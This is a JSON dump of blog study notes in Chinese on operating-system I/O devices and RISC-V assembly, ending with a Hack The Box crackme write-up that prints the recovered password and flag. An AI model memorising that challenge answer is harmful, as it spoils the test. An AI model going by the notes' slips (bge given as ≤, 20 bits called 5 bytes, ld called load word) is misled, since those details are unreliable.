会直接与设备驱动程序交互，确保设备顺序执行任务。用户进程的任务先存入 Spooling 目录（缓冲区），然后按顺序执行。 UNIX/Linux里的设备管理在UNIX/Linux里，我们需要通过文件系统访问 I/O 设备（因为“Everything is a file”）： 在访问设备前，必须先打开它 open。 不同设备支持额外的文件系统操作，如读写、状态查询等。 设备管理位于 /dev 目录，所有设备文件都存放在这里。 设备状态查询和配置可能位于 /proc 目录。 设备文件名称指示设备类型，比如说： /dev/tty0：物理串行接口（终端）。 /dev/USBtty1：抽象串行接口（USB 串口设备）。 /dev/sd0：硬盘设备（sd 代表 SCSI 磁盘）。 /dev/null：伪设备，写入的数据会被丢弃。 /dev/zero：伪设备，读取时返回无限的 0 字节。 Spooling 任务存储在 /var/spool 目录下，其中 lpq：打印任务队列（打印机 Spooling）。 mqueue：邮件服务器的发送队列（邮件 Spooling）。 news：新闻系统消息队列（新闻 Spooling）。 cron：定时任务执行队列（任务调度 Spooling）。 而设备的真正标识存储在 i-Node 中。i-Node会包含： 主设备号（Major Device Number）：标识设备驱动程序（决定设备的驱动）。 次设备号（Minor Device Number）：要访问的具体设备。 设备例子（机械）硬盘（Festplatten，HDD）机械硬盘属于Block-Gerät，有着以下构造： 同心圆柱（Konzentrische Zylinder） 堆叠的磁盘盘片（Platten, k 层），每张盘片的两面都可以读写（2k 面）。 每张盘片上有多个磁道（Tracks），磁道的编号取决于 圆柱、盘片和面（Track = f(Zylinder, Platte, Seite)）。 每个磁道由多个扇区（Sektoren）组成，每个扇区大小为 512 字节。不过靠近磁盘中心的区域可能有更少的扇区（由于圆周较小）。 机械读写磁头（Schreib-/Leseköpfe），每个盘片有两个读写磁头（上下各一个），总数为 2k。 构造图示： 早期会用到3个参数来确定需要读写的具体位置： x Zylindernummer，Radius：确定是哪一个环； y Kopfnummer，Höhe：确定是哪一张盘片的哪一面； z Sektornummer pro Winkel：确定是哪个扇面； 由于早期 BIOS 和文件系统的设计的限制，只能访问有限的区域。 所以现在一般都使用线性逻辑地址（lineare Adressierung logischer Blöcke），即给每个Sector编号（0，1，2，3，…）。 一个Sector里会包含以下信息： 前导信息（Präambel）： 包含同步位、磁道号和扇区号 数据（Daten）： 通常为512字节 错误校正码（ECC）： Error Correcting Code Cylinder Skew: The offset distance from the start of the last track of the previous cylinder so that the head has time to seek from cylinder to cylinder and be at the start of the first track of the new cylinder. Head Skew: The offset distance from the start of the previous track so that the head has time to switch from top of platter to bottom of platter and be at the start of the new track. 控制器通常一次读取整个磁道，这会需要足够的缓存来存储数据。但假如没有足够的缓存，则会采用交错的格式（ Formatierung mit Interleaving）：扇区不会按顺序排列的：1, 2, 3, 4, 5, 6, …, 15，而是交错排列的：1, 4, 7, 10, 13, 2, 5, 8, 11, 14, 3, 6, 9, 12, 15。这样子可以确保读取某个扇区 N ，将数据传输到主存后，扇区 N+1 会刚好移动到读写头下方，不需要再多等一圈。（因为磁盘好像是会一直转的） 为了避免磁盘损坏影响硬盘功能，会使用RAIS-System。（详细内容见数据库的笔记） 读写磁头找到所需Sector的策略分3种： FCFS Shortest Seek First (SSF) Elevator algorithm (Fahrstuhl-Algorithmus) 固态硬盘（SSD）SSD的全称为Solid State Drives，主要基于 (NAND) 闪存。 SSD的一些特点： 无机械部件（Keine beweglichen Teile） 所以不会有机械磨损及其导致的故障，更耐振动、冲击等，访问速度更快。 仍然可能出现故障（Fehlfunktionen auch hier möglich），比如 坏块，存储芯片故障（Bad blocks, Fehler in Speicherchips） 反复读取可能影响相邻存储单元 故障可能导致整个 SSD 无法读取 数据恢复更加复杂 闪存写入次数有限（Flash-Speicher nur begrenzt oft schreibbar） 读取比写入快，顺序（sequentiell）写入比随机写入快 SSD的基本工作原理SSD的初始状态是： 111111111 11111111 11111111 ... 写入的话会将1改成0： 101000111 01000010 01010011 ... 但如果想修改的话，不能只是修改一位，而是需要将这一整块重置然后再写入。 写入的大小最低为4KB，删除的大小最低为256KB，所以会导致所谓的写入放大（Write Amplification）的问题。 解决方式：这部分我没看懂，等看懂了再写。 时钟（Uhr,）时钟会持续性计时。 硬件时钟（Hardware-Uhr (Chip)）的构成： Quarz als Taktgeber： 石英晶体”作为时钟信号源，用来产生稳定的振荡信号（周期性电信号）作为“节拍”。 计数器（Zähler）： 每个时钟节拍到来时，计数器的值会减1（dekrementiert）； 当计数器值减到0时，就会触发一个中断（Interrupt）。 Register zum (wiederholten) Setzen des Zählers auf einen Startwert： 可以通过软件来控制Interrupt的频率。 时钟/定时器的任务： 管理时间和日期（Tageszeit und Datum verwalten） 中断和切换进程（调度）（Prozesse unterbrechen und umschalten (Scheduling)） 测量某个进程的计算时间消耗（Rechenzeitverbrauch eines Prozesses messen） 向应用程序提供定时器功能（ Zeitschaltuhren den Anwendungen zur Verfügung stellen） 功能监控（看门狗定时器）（Funktionsfähigkeitsüberwachung (watchdog timer)） 性能分析、监控、统计（Profiling, Monitoring, Statistik） 可以用链表的数据结构来管理定时事件： 所有时间均为相对时间（relativen Zeiten），也就是说每个节点的值代表相对于前一个事件的延迟（以 tick 为单位）。 定时器（Timer）Timer（定时器）确实通常分为两种类型： 硬件定时器（Hardware Timer）： 系统通常有第二个可编程定时器。它在到时间的时候会触发Interrupt。但Interrupt的代价有点高，因为会引发上下文切换，并且可能会干扰程序正常运行。 软件定时器（Software Timer）： 这个的想法是只在系统处于内核态时检查定时器状态（nur dann aktiv werden, wenn System im Kernel-Mode ist），这样一来就不需要额外的上下文切换。在从内核模式切换到用户模式之前，操作系统读取实时时钟并检查是否有软件定时器已经超时，如有需要，处理相应的事件。 它的缺点也很明显，就是延迟，不过大部分情况下都是可以接受的。 终端（Terminals）终端是如何通过驱动程序将用户输入/输出转化为系统能够理解的数据流的： 上层：提供一个统一接口给操作系统的输入/输出子系统（Einheitliche Schnittstelle zum E/A-Subsystem des BS） 中层：解析输入和构造输出内容（Bearbeitungsmodul für Ein- und Ausgaben） 下层：与不同的物理硬件设备直接对应（Abbildung verschiedene physische Geräte），比如鼠标、显卡。 系统中的 terminal 是一个底层的字符设备机制，管理输入输出流、进程控制和驱动之间的协作。而我们平常用的cmd只是是 terminal的一种表现形式。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"输入/输出","slug":"输入-输出","permalink":"https://archer-baiyi.github.io/tags/%E8%BE%93%E5%85%A5-%E8%BE%93%E5%87%BA/"}]},{"title":"RISC-V 汇编语言入门","slug":"TUM笔记/ERA/RISC-V-汇编语言入门","date":"2025-03-19T19:56:10.000Z","updated":"2025-04-01T21:50:08.597Z","comments":true,"path":"2025/03/19/TUM笔记/ERA/RISC-V-汇编语言入门/","permalink":"https://archer-baiyi.github.io/2025/03/19/TUM%E7%AC%94%E8%AE%B0/ERA/RISC-V-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"计算机体系结构基础相关笔记","text":"[toc] RISC-V 寄存器在 RISC-V 中，所有操作数（Operanden）都存储在寄存器中。 RISC-V ISA 拥有 32 或 33 个（可见）寄存器，其中x0永远为零，而x1 到 x31 是通用整数寄存器，f1 到 f31 是 浮点寄存器： Register ABI Name Description Saver x0 zero Hard-wired zero — x1 ra Return address Caller x2 sp Stack pointer Callee x3 gp Global pointer — x4 tp Thread pointer — x5–7 t0–2 Temporaries Caller x8 s0/fp Saved register/frame pointer Callee x9 s1 Saved register Callee x10–11 a0–1 Function arguments/return values Caller x12–17 a2–7 Function arguments Caller x18–27 s2–11 Saved registers Callee x28–31 t3–6 Temporaries Caller Register ABI Name Description Saver f0–7 ft0–7 FP temporaries Caller f8–9 fs0–1 FP saved registers Callee f10–11 fa0–1 FP arguments/return values Caller f12–17 fa2–7 FP arguments Caller f18–27 fs2–11 FP saved registers Callee f28–31 ft8–11 FP temporaries Caller 这里第一列的是每个寄存器的编号，而第二列则是附带语义的名字。一般在汇编代码中使用ABI name，便于理解和维护。 关于Saver部分可以看下面这个表，会更直观一点： Name Meaning Saver Preserved across calls? ra Return address Caller No sp Stack pointer Callee Yes t0 - t6 Temporary registers Caller No s0 - s11 Callee-saved registers Callee Yes a0 - a7 Argument registers Caller No Caller指的是调用函数的一方（比如说main()），而Callee指的则是被调用的函数。 如果一个register的Saver是Caller，则调用函数的一方（Caller）需要在调用函数前将这些寄存器里的值都存储好，以便被调用函数可以随意使用； 如果一个register的Saver是Callee，则被调用函数需要确保这些寄存器的值在该函数结束后与之前一模一样。 通俗一点来讲，前者是将自己的笔记本备份好之后借出去，借用方（Callee）可以随意使用；后者则是将笔记本借出去，但借用方必须确保拿到的时候是什么样子的还回去的时候也得是什么样子的。 RISC-V 汇编语言每一个ISA（Instruction Set Architecture）的指令都可以分为以下3大类： 算术和逻辑运算（Arithmetische und logische Operationen） 数据传输（Datentransfer） 程序控制 （Steuerung des Programmablaufs）：跳转和子程序调用（ Sprünge und Unterprogrammaufrufe） RISC-V 汇编指令一览： 算术 Arithmetik加法： a = b + c 1add a,b,c 减法： a = b - c 1sub a,b,c 组合： a = b + c - d 12add t,b,c # t=b+csub a,t,d # a=t-d 浮点数的情况： “f” 用于 Single Precision (32bit) Gleitkomma； “d” 用于 Double Precision (64bit) Gleitkomma。 1234fadd a,b,cfsub a,b,cdadd a,b,cdsub a,b,c 乘法的话基本上就是以下几种： 只不过RISC-V 的基本整数指令集中（RV32I 和 RV64I）不包含 mul 指令，乘法运算通常需要 M 扩展（RV32M/RV64M）。如果只允许使用 RV32I/RV64I 指令，则必须通过移位和加法手动实现乘法。 在硬件实现上，移位操作比乘法更快，因为移位仅涉及逻辑电路，而乘法通常需要额外的计算资源。 例子： 假设 $s1 = 0x40000000 = 2^{30}$ $ s2 = 0x80000000 = -2^{31}$ $ s1 * s2 = -2^{61} = 0xE0000000 00000000$ 那么 123mul s3, s1, s2mulh s4, s1, s2# &#123;s4,s3&#125; = s1 * s2 便会得到 $ s4 = 0xE0000000; s3 = 0x00000000$ 除法以及余数： 逻辑运算 Logische Operation和： a = b AND c 1and a,b,c 或： 1or a,b,c 异或： 1xor a,b,c 移位（Shifts）： 移位操作分为2种： 1. 逻辑移位 logischer Shift ，用 &gt;&gt;, &lt;&lt;表示 用 0 填充空出的高位，无论原数是正数还是负数(Null Bits nachgeführt)，适用于 无符号数（unsigned numbers） 计算。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1srl t0, t0, 4 会得到 1t0 = 0000 1111 1111 1111 1111 1111 1111 1110 = 268435454（正数） 例子2： 假设 1t0 = 0000 0000 0000 0000 0000 0000 0001 1001 # 25（十进制） 那么经过 1sll t0, t0, 4 会得到 1t0 = 0000 0000 0000 0000 0000 0001 1001 0000 = 400（正数） （$400 = 25 * 2^4$） 2. 算术移位 arithmetischen Shift，用 &gt;&gt;&gt;, &lt;&lt;&lt; 表示 会保持符号位（MSB）不变 (erhält Vorzeichen, 0 oder 1 nachgeführt) 如果是正数（MSB = 0），则用 0 填充高位。 如果是负数（MSB = 1），则用 1 填充高位。 适用于 有符号数（signed numbers） 计算，保持符号正确。 例子1： 假设 1t0 = 1111 1111 1111 1111 1111 1111 1110 0111 = -25（补码表示） 那么经过 1sra t0, t0, 4 会得到 1t0 = 1111 1111 1111 1111 1111 1111 1111 1110 = -2 (负数) 左移本质上就是乘法。无论有符号数还是无符号数，左移的行为都是相同的，所以 RISC-V 没有 sla指令。 这里的 uimm 会被限制在 5-bit 的无符号整数。 数据传输（Datentransfer）读取（Lesen vom Speicher）： ld (load word) Format： 1ld destination, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 写入（Schreiben in den Speicher）： sd (store word) Format： 1sd source, offset(base) 例子： 1ld a1, 8(s0) Basisadresse (s0) zum Offset (8) addieren, Adresse = ([Wert in s0] + 8) 跳转 Sprung无条件跳转： 12j immjr reg, imm 第一个会跳转到PC = PC + imm 第一个会跳转到PC = reg + imm 有条件跳转： 格式： 1bxx r1,r2,imm bxx的可选选项： branch if equal (beq)：$r1 = r2$ branch if not equal (bne)：$r1 \\neq r2$ branch if less than (blt)：$r1 &lt; r2$ branch if greater than or equal (bge)：$r1 \\leq r2$ 例子1（if）： 123if (i == j)&#123; f = g + h;&#125;f = f – i; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123456# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2L1: sub s0, s0, s3 例子2（if, else）： 1234if (i == j)&#123; f = g + h;&#125;else&#123; f = f - i;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678# s0 = f, s1 = g, s2 = h# s3 = i, s4 = j bne s3, s4, L1 add s0, s1, s2 j doneL1: sub s0, s0, s3done: 例子2（while 循环）： 12345678// Berechne x, so dass// 2^x = 128int pow = 1;int x = 0;while (pow != 128) &#123;pow = pow * 2;x = x + 1;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 12345678910# s0 = pow, s1 = x addi s0, zero, 1 add s1, zero, zero addi t0, zero, 128while: beq s0, t0, done slli s0, s0, 1 addi s1, s1, 1 j whiledone: 子程序调用 UnterprogrammeBegriffe： Caller（调用者）：调用函数的代码（如 main()）。 Callee（被调用者）：被调用的函数（如 simple()）。 12jal reg, offset #调用jr ra #返回 例子： 12345678int main() &#123; simple(); a = b + c;&#125;void simple() &#123;return;&#125; 跟上面这段c代码等价的RISC-V Assembler（汇编）： 123450x00000300 main: jal simple # call0x00000304 add s0, s1, s2... ...0x0000051c simple: jr ra # return 其他的伪命令： 1mv ra, rb 跟 12add ra,rb,x0addi ra,rb,x0 等价。 递归（Rekursion）普通递归例子1：阶乘 1234int factorial(int n) &#123; if (n == 0) return 1; return n * factorial(n - 1); // （递归调用后还有乘法,所以是非尾递归）&#125; 对应的RISC-V（n=4的情况示例）： 1234567891011121314151617181920212223 _start:0x200 addi a0, zero, 4 # a0 = 4，计算 4 的阶乘（作为输入参数）0x204 jal ra, magic # 跳转调用 magic 函数（递归实现阶乘），返回地址存入 ra0x208 ebreak # 程序断点（模拟器中用于停止执行） magic:0x20c beq a0, zero, break # 如果 a0 == 0，跳转到 break（0! = 1）0x210 addi sp, sp, -8 # 分配栈空间：只保存 ra 和 a0，所以是2*4=8Bits0x214 sw ra, 0(sp) # 保存返回地址 ra 到栈顶0x218 sw a0, 4(sp) # 保存当前参数 a0（n）0x21c addi a0, a0, -1 # a0 = a0 - 1，准备递归调用 magic(n-1)0x220 jal ra, magic # 递归调用 magic(n-1)，返回值仍存在 a0 中0x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） break:0x238 addi a0, zero, 1 # a0 = 1，返回 1（0! = 1）0x23c jalr zero, 0(ra) # 返回调用者 由于每次计算 factorial(n) 的值时需要先等 factorial(n-1)的计算结果先出来，所以等待期间需要将所有的 n 都给存在stack里，也就是说： 123456789101112factorial(4) → 需要等factorial(3) 的结果 → 需要等 factorial(2) 的结果 → 需要等 factorial(1) 的结果 → 需要等 factorial(0) 的结果 → 返回 1然后开始回溯计算：factorial(1): 1 * 1 = 1factorial(2): 2 * 1 = 2factorial(3): 3 * 2 = 6factorial(4): 4 * 6 = 24 而栈结构如下： 12345678910111213+--------------------+| 0x4 || 0x208 |+--------------------+| 0x3 || 0x224 |+--------------------+| 0x2 || 0x224 |+--------------------+| 0x1 || 0x224 |+--------------------+ 返回的时候则是这样：当a0=0的时候触发0x20c的beq，跳转到break，break执行完了会跳转到当前的ra（也就是stack最底下一行的0x224），然后进行这部分操作： 123450x224 lw t0, 4(sp) # 从栈中恢复原来的 a0（也就是 n）0x228 mul a0, a0, t0 # a0 = a0 * n（也就是 n! = n * (n-1)!）0x22c lw ra, 0(sp) # 恢复之前保存的返回地址0x230 addi sp, sp, 8 # 回收栈空间0x234 jalr zero, 0(ra) # 返回调用者（函数返回） 计算a0 = 1*1然后继续跳转到stack倒数第三行的0x224，重复下去知道跳转到0x208，触发断点。 例子2：最大公约数 12345678unsigned ggT(unsigned a, unsigned b) &#123; if (a == b) return a; else if (a &lt; b) return ggT(a, b - a); else return ggT(a - b, b);&#125; 对应的RISC-V： 1234567891011121314151617181920ggT: beq a0, a1, finished # 如果 a0 == a1，则跳转到 finished（返回结果） bltu a0, a1, lt # 如果 a0 &lt; a1，则跳转到 lt 标签（交换顺序） sub a0, a0, a1 # 否则 a0 &gt; a1，执行 a0 = a0 - a1 j cont # 跳转到 cont，准备递归调用lt: sub a1, a1, a0 # 执行 b = b - a （即 a1 = a1 - a0）cont: addi sp, sp, -16 # 为返回地址创建栈空间（递归调用前保存返回地址） sw ra, 0(sp) # 保存返回地址 jal ra, ggT # 递归调用 ggT（jump and link） lw ra, 0(sp) # 恢复返回地址 addi sp, sp, 16 # 回收栈空间 jalr zero, 0(ra) # 返回（跳转回上层调用） finished: jalr zero, 0(ra) # 返回当前的 a0 作为结果 总结一下： 每个Recursive的函数递归部分会分成2部分： 从当前n的情况跳转到n-1，保存当前n的值以及返回地址（即当前跳转命令的下一行的地址） 读取返回地址并用当前已经计算出来的n-1的情况的值与n进行函数运算。 相当于递减完了之后还得递增回来。 注意，2个例子里分配的stack的大小是不一样的，这个主要是看ABI的具体要求，这里主要目的是示范而已。但不管大小如何，一定要保证分配的Stack大小和回收的大小是一致的。 尾递归（Tail Rekursiob）观察上面例子里stack存储的内容不难发现，如果递归的次数较高，则会很容易导致Stack Overflow。 为了解决这个问题，我们可以使用另一种递归方式：尾递归（Tail Rekursiob） 还是拿阶乘举例，我们将代码优化成这样： 1234int factorial(int n, int acc = 1) &#123; if (n == 0) return acc; return factorial(n - 1, n * acc); // 尾调用&#125; 对应的RISC-V： 123456789factorial: beqz a0, end_factorial mul a1, a0, a1 # acc = acc * n addi a0, a0, -1 # n = n-1 tail factorial # 尾调用（跳转，无需保存返回地址）end_factorial: mv a0, a1 # 返回结果 ret 这里的调用过程则会变成： 12345factorial(3, 1)→ 直接 tail call 到 factorial(2, 3)→ 再 tail call 到 factorial(1, 6)→ 再 tail call 到 factorial(0, 6)→ 结束：返回 acc = 6 栈结构如下： 12345678910+--------------------+| 当前调用（复用栈帧）|| n=3, acc=1 |→ tail call → 替换为：| n=2, acc=3 |→ tail call → 替换为：| n=1, acc=6 |→ tail call → 替换为：| n=0, acc=6 |→ return 6 不再需要存储所有中间的 n 的值。相当于是直接跳转而不是等待。 带有立即数（immediate）的命令立即数（Immediate/Konstante）：由指令本身携带，不需要从寄存器或内容中加载 aadi a = b + imm（一个立即数） 1addi a,b,&lt;imm&gt; 注意，RISC-V里是没有subi这种操作的，因为它可以被addi代替： subi a,b,x是等价于addi a,b,-x的（这里的x是一个立即数/常数）。 但sub不可以被add替代，是因为sub a,b,-c这个操作不合规（c是一个register，不存在-c这种操作）。 这里可以使用的立即数的大小会被限制在$[-2^{11},2^{11}) = [-2048,+2047]$ （具体原因会在之后机器码的部分阐述） 生成32-Bit的常数： 需要用到 load upper immediate (lui) 和 addi lui 的作用是将一个常数加载到目标寄存器的高 20 位（也就是5Bytes），并将低 12 位（4Bytes）填充为 0。 而addi则负责将低 12 位（4Bytes）的数值加到目标寄存器中。 例子： C: 1int a = 0xFEDC8765; 对应的汇编： 123# s0 = alui s0, 0xFEDC8 # s0 = 0xFEDC8000addi s0, s0, 0x765 RISC-V 机器码 Machine Code/Instrunction将汇编语言翻译成机器码主要依靠下面这2张表： 首先，所有的操作会被分成6个大类： Register/register (R) Immediate (I) Upper immediate (U) Store (S) Branch (B) 条件跳转 Jump (J) 然后会通过funct3以及funct7确定具体操作。（funct7更多的是为了扩展的操作/功能。） rs1, rs2, rd存储的是寄存器的地址，而imm存储的则是立即数（immediate）的数值。其中rd是目标寄存器。 例子： 1addi a1, a2,1 假设a1（rd），a2（rs1）的地址为00010，01010， 因为addi指令的opcode和funct3为：0010011, 000 ，这行命令会翻译成以下的机器码： 123imm[11:0] | rs1 | funct3 | rd | opcode------------|-------|--------|-------|--------000000000001| 01010 | 000 | 00010 | 0010011 S,T,J 那部分内容将imm的值拆成好几部分是为了其他内容的位置可以对齐，比如说rs2的位置都是第20-24bit。 Branch和Jump都是跳转操作，所以会将imm（跳转地址）的第一位（符号位）imm[12]或者imm[20]放在开头，以确定是向后跳转还是向前。然后因为RISC-V的命令都是32位的，也就是4Byte，所以所有地址都是4的倍数，也就不需要imm[0]的信息了，因为imm[0]始终等于0。 例题1. Register s5 nullen 将寄存器s5的值设为0：123mov s5, 0#或者是li s5, 0 2. Wert in Register a1 nach s3 kopieren 将s3的值复制到s1里：1mv s3, a1 3. Dasunterste Bit von a0 nach t1 schreiben, restliche Bits sollen 0 sein 将 a0 的最低位写入 t1，其他位清零:1andi t1, a0, 1 1在二进制中只有最后一位是1，其他位置都是0，所以a0的其他位置与0进行and操作都会得到0，而最后一位与1进行and操作会保留原本内容。 4. Register s1 mit Einsen füllen 将寄存器 s1的值为全都是 1：1li s1, -1 因为-1 的二进制表示全 1 5. Unterstes Byte von t0 nach a0 schreiben, Rest unverändert 将 t0 的最低字节写入 a0，保持其余部分不变：12andi a0, a0, -256 # 清除 a0 的最低字节 (0xFFFFFF00)or a0, a0, t0 # 直接合并 t0 低字节 -256的二进制表示为 11111 1111 1111 1111 1111 1111 0000 0000 最后一个Byte的内容都是0，所以将它与a0进行and操作可以清除a0的最后一个Byte的内容，前面的保留。 然后将a0和t0直接进行or操作，会保留a0的前面部分，以及t0的最后一个Byte的内容。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"汇编语言","slug":"汇编语言","permalink":"https://archer-baiyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"RISC-V","slug":"RISC-V","permalink":"https://archer-baiyi.github.io/tags/RISC-V/"}]},{"title":"1 Einführung und Datenrepräsentation","slug":"TUM笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation","date":"2025-03-18T12:12:02.000Z","updated":"2025-03-25T19:32:44.477Z","comments":true,"path":"2025/03/18/TUM笔记/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","permalink":"https://archer-baiyi.github.io/2025/03/18/TUM%E7%AC%94%E8%AE%B0/ERA/ERA-1-Einfuhrung-und-Datenreprasentation/","excerpt":"计算机体系结构基础相关笔记","text":"Einführung in die Rechnerarchitektur (ERA)DatendarstellungenZahlensystemeDezimalsystem Binärsystem Hexadezimalsystem Gängige Wortlängen Negative Ganze Zahlen假如专门用一个Bit来表示正负号（比如说)，这样子做会带来一个问题： 0 = 1+(-1) \\Longleftrightarrow 0000 0000 = 1000 0001 + 0000 0001 = 1000 0000所以一般使用Zweierkomplement，即Invertierung (Einerkomplement) + 1。 例子： 这样做的好处就是加法会非常自然： -1 + 1 = 1111 1111 + 0000 0001 = 1 0000 0000 \\rightarrow 0000 0000 = 0","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}]},{"title":"HTB_rev Find The Easy Pass","slug":"CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass","date":"2025-03-16T21:39:15.000Z","updated":"2025-03-25T19:32:29.077Z","comments":true,"path":"2025/03/16/CTF/Reverse Engineering/HTB-rev-Find-The-Easy-Pass/","permalink":"https://archer-baiyi.github.io/2025/03/16/CTF/Reverse%20Engineering/HTB-rev-Find-The-Easy-Pass/","excerpt":"","text":"这道题会给我们一个exe文件，打开是一个判断输入的密码是否正确的软件： 我们用IDA打开它，会发现并没有反编译出main()函数。所以我们随便输入一点内容试一下： 会返回Wrong Password!字样。接着我们尝试用IDA搜索这段内容，会发现： 点击第二个结果会跳转到： 注意到它的上方有着”Goob Job. Congratulation”的字样，我们猜测这是输入成功后返回的内容，所以我们点击它下方 XREF的内容，查看这个变量在哪里被调用过，通过反汇编会得到以下内容：12345678910111213141516171819202122232425262728293031323334353637383940414243int __fastcall TForm1_Button1Click(int a1)&#123; int v2; // ecx int v3; // edx char v4; // zf unsigned int v6[2]; // [esp-Ch] [ebp-38h] BYREF int *v7; // [esp-4h] [ebp-30h] int v8; // [esp+4h] [ebp-28h] BYREF int v9; // [esp+8h] [ebp-24h] BYREF int v10; // [esp+Ch] [ebp-20h] BYREF int v11; // [esp+10h] [ebp-1Ch] BYREF int v12; // [esp+14h] [ebp-18h] BYREF int v13; // [esp+18h] [ebp-14h] BYREF int v14; // [esp+1Ch] [ebp-10h] BYREF int v15; // [esp+20h] [ebp-Ch] BYREF int v16; // [esp+24h] [ebp-8h] BYREF int v17; // [esp+28h] [ebp-4h] BYREF int savedregs; // [esp+2Ch] [ebp+0h] BYREF v7 = &amp;savedregs; v6[1] = (unsigned int)&amp;loc_454171; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]); System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]); System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]); System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]); System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]); System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]); System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); Controls::TControl::GetText(*(Controls::TControl **)(a1 + 760)); System::__linkproc__ LStrCmp(v8, v17); if ( v4 ) Dialogs::ShowMessage((Dialogs *)&amp;str_Good_Job__Congr[1], v3); else Dialogs::ShowMessage((Dialogs *)&amp;str_Wrong_Password_[1], v3); __writefsdword(0, v6[0]); v7 = (int *)&amp;loc_454178; System::__linkproc__ LStrClr(&amp;v8); return System::__linkproc__ LStrArrayClr(&amp;v9, 9);&#125; 这段代码的主要逻辑是将这些赋值变量 123456789System::__linkproc__ LStrLAsg(&amp;v16, &amp;str_f[1]);System::__linkproc__ LStrLAsg(&amp;v15, &amp;str_o[1]);System::__linkproc__ LStrLAsg(&amp;v14, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v13, &amp;str_t[1]);System::__linkproc__ LStrLAsg(&amp;v12, &amp;str_r[1]);System::__linkproc__ LStrLAsg(&amp;v11, &amp;str_a[1]);System::__linkproc__ LStrLAsg(&amp;v10, &amp;str_n[1]);System::__linkproc__ LStrLAsg(&amp;v9, &amp;str___13[1]); 拼接成一个新的字符串 v17 1System::__linkproc__ LStrCatN(&amp;v17, 8, v2, v15, v14, v13, v12, v11, v10, v9); 然后比较输入的字符串与v17。所以我们只需要查看那些赋值字符串的具体值便可得到密码：fortran! 按照题目要求flag内容为：HTB{fortran!}。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Reverse 